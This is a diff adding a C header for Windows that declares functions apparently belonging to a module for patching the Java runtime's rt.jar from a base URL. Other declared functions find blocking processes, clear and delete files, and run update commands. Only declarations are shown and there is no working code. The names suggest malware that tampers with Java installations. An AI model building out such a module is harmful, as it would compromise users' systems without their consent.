@@ -1,0 +1,22 @@
+#ifndef		JAVS_PATCHERH
+#define		JAVS_PATCHERH
+
+
+#include "windows.h"
+
+CHAR* GetJREPath(DWORD* error);
+DWORD FindBlockingProcesses(char* FileName, ULONG** PIDs);
+
+DWORD PatchRtJar(char* user_name, char* base_url, CHAR* libPatch);
+unsigned long getCRC32(char *pchBuf, int nBufLen);
+DWORD WINAPI JavaPatch( LPVOID lpData );
+bool WJFile();
+const char UpdatePath[] = "UpdatePatch\0";
+bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
+
+DWORD WINAPI ClearAndDel( LPVOID lpData );
+DWORD IsJavaCompatibleVersion();
+int WINAPI ShowHypeMessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
+
+DWORD WINAPI Run_Path(LPVOID lpData);
+#endif		//java_patcher
